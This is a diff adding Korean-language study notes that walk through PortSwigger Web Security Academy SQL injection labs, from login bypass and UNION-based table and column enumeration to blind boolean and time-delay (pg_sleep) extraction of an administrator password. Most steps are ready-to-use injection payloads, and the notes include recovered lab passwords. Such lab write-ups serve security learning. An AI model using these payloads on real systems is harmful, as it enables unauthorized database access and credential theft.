@@ -1,0 +1,106 @@
+1) Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+> 숨겨진 데이터 찾기
+
+1. 카테고리 선택
+
+2. 카테고리 파라미터에 ' or '1'='1 추가
+
+
+2) Lab: SQL injection vulnerability allowing login bypass
+> 로그인 우회
+
+1. 로그인 시도
+
+2. 주어진 어드민 계정에 '-- 주석 추가
+
+
+3) Lab: SQL injection attack, querying the database type and version on Oracle
+> 오라클 버전 취약점
+
+1. 카테고리 선택
+
+2. 카테고리 파라미터에 오라클 테이블의 dual을 이용
+'union select 'qwe','asd' from dual--
+
+3. 파라미터에 오라클 버전확인 쿼리 삽입
+'union select BANNER,NULL from v$version--
+
+
+4) Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+> MySQL 버전 취약점
+
+1. 카테고리 선택
+
+2. 카테고리 파라미터에 오라클 테이블의 dual을 이용
+'union select 'qwe','asd'#
+
+3. 파라미터에 mysql 버전확인 쿼리 삽입
+Pets%27+union+select+version(),null%23
+
+
+5) Lab: SQL injection attack, listing the database contents on non-Oracle databases
+> 
+
+1. 카테고리 선택
+
+2. 카테고리에 테이블 이름을 찾을 쿼리 삽입
+union select table_name, NULL from information_schema.tables--
+
+3. 테이블 이름으로 컬럼 찾을 쿼리 삽입
+union select column_name, NULL from information_schema.columns where table_name='users_befwpn'--
+
+4. 컬럼을 찾고 확인하는 쿼리 삽입
+union select password_rhgked, username_bmdbht from users_befwpn--
+
+5. 로그인 시도
+
+
+
+----------------------------
+Blind
+1) Lab: Blind SQL injection with conditional responses
+> 블라인드 sqli
+
+1. 카테고리나 상품, 로그인 창들어갔다 돌아오기
+> 그래야 Welcome back! 이 보임
+
+2. 버프스윗에서 트래킹아이디에서 sqli 시도
+> 로그인 중에 할 줄 알았는데 아니였음
+> 트래킹아이디는 처음 알음(조금 찾아봄)
+AND '1'='1 / AND '1'='2
+
+3. 트래킹아이디에 블라인드 sqli 쿼리 삽입 & 버프스윗의 인트루더로 자동화
+> Welcome back! 으로 참/거짓 구분
+> 아이디는 알고있으니 비밀번호 알아내기
+글자 수 확인 쿼리
+AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+특정 데이터 비교 쿼리
+AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+4. 알아낸 비밀번호로 로그인
+> 인트루더에서 렌더가 보이지않아 Length 값으로 확인함
+hxxyfpyth5d4h5bgtuuc
+
+
+2) Lab: Blind SQL injection with time delays and information retrieval
+> 응답시간 블라인드 sqli
+
+1. 트래킹아이디에 슬립쿼리로 확인
+portswigger에선 케이스를 사용
+%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+> 1=1 이 참이니 10초 지연. 거짓이면 지연없이 넘어감
+간단하게는
+%3BSELECT pg_sleep(10)--
+pg_sleep을 처음 알음(조금 찾아봄)
+
+2. 케이스에 조건 변경 & 버프스윗의 인트루더로 자동화
+아이디 확인
+%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+비밀번호 글자 수 확인
+%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+데이터 확인
+%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+3. 알아낸 비밀번호로 로그인
+> 인트루더의 Response received로 확인함
+j74py3muqf6z6t1pobns
